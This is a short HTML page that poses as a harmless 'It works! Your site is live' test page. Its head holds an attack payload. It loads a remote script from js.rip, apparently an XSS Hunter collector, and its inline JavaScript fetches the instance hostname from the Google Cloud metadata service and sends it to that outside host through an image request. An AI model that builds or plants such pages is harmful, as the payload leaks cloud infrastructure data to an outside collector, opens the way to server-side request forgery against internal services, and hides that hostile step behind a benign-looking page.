<!DOCTYPE html>
<html>
<head>
  <title>Test Page</title>
  <script src="https://js.rip/5mw8at9w5s"></script>
  <script>
    fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname", {
      headers: { "Metadata-Flavor": "Google" }
    })
    .then(r => r.text())
    .then(hostname => {
      // Send raw hostname as query param so it shows in XSS Hunter logs
      new Image().src = "https://js.rip/5mw8at9w5s?leaked=" + encodeURIComponent(hostname);
    });
    // No .catch — if fetch fails, only the script load fires
  </script>
</head>
<body>
  <h1>It works! Your site is live 🚀</h1>
</body>
</html>
